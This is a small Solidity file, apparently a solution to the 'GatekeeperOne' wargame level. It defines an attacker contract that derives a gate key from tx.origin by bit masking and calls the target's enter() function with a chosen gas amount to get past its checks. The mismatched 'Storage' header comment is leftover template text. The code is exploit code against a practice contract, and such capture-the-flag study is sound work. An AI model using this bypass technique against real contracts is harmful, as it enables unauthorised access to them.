// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */

interface GatekeeperOneI {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackerGatekeeperOne {
    GatekeeperOneI gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOneI(_gatekeeperOne);
    }

    function calling(uint256 _gas) external {
        bytes8 gatekey = bytes8(uint64(uint160(tx.origin))) &
            0xA00000000000FFFF;

        gatekeeperOne.enter{gas: _gas}(gatekey);
    }
}
